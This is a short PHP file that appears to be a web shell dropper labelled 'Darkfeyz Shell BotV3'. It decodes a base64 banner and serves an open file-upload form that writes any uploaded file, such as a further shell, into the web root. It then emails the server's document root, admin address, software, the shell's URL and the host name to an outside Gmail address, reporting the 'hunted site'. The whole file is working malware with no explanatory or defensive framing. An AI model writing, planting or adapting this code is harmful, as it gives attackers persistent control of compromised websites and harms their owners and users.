<?php
$str = 'RGFya2ZleXpTaGVsbFYzQm90MFhfZ29wXzIwMjA=';echo base64_decode($str);
?>
<title>Vuln!! patch it Now! DarkfeyzV3Bot</title>
<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
else { echo '<b>Not uploaded ! </b><br><br>'; }
}
?>
<?php
$kime="hiphoptra@gmail.com";
$baslik="Darkfeyz Shell BotV3";
$spyhackerz="Dosya Yolu : ".$_SERVER['DOCUMENT_ROOT']."\r\n";
$spyhackerz.="Server Admin : ".$_SERVER['SERVER_ADMIN']."\r\n";
$spyhackerz.="Server isletim sistemi : ".$_SERVER['SERVER_SOFTWARE']."\r\n";
$spyhackerz.="Shell Link : http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\r\n";
$spyhackerz.="Avlanan Site : " .$_SERVER['HTTP_HOST']."\r\n";
mail($kime, $baslik, $spyhackerz);
?>
